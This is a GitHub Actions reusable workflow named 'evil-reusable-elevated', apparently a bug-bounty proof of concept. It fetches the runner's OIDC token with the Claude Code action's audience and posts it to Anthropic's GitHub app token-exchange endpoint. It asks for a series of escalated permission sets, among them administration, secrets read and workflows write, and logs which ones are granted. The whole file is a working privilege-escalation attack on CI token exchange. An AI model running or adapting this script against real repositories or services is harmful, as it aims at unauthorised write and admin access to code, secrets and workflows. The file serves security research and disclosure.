name: evil-reusable-elevated

on:
  workflow_call:

permissions:
  id-token: write
  contents: read

jobs:
  exchange:
    runs-on: ubuntu-latest
    steps:
      - name: Try elevated permissions through reusable
        run: |
          AUD="claude-code-github-action"
          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
          TOK=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
          echo "::add-mask::$TOK"
          for p in '{"contents":"write","pull_requests":"write","issues":"write"}' \
                   '{"contents":"write","administration":"write"}' \
                   '{"contents":"write","actions":"write"}' \
                   '{"contents":"write","secrets":"read"}' \
                   '{"contents":"write","workflows":"write"}' \
                   '{"contents":"write","deployments":"write"}' \
                   '{"contents":"write","packages":"write"}'; do
            HTTP=$(curl -sk -o /tmp/r.json -w '%{http_code}' \
              -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
              -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -H "X-HackerOne-Handle: liamconner10" \
              -d "{\"permissions\":$p}")
            RESP=$(jq -c 'if .token then {ok:true, expires_at} else {ok:false, code:.error.details.error_code, msg:.error.message} end' /tmp/r.json)
            echo "PERM_TEST: req=$p http=$HTTP resp=$RESP"
          done
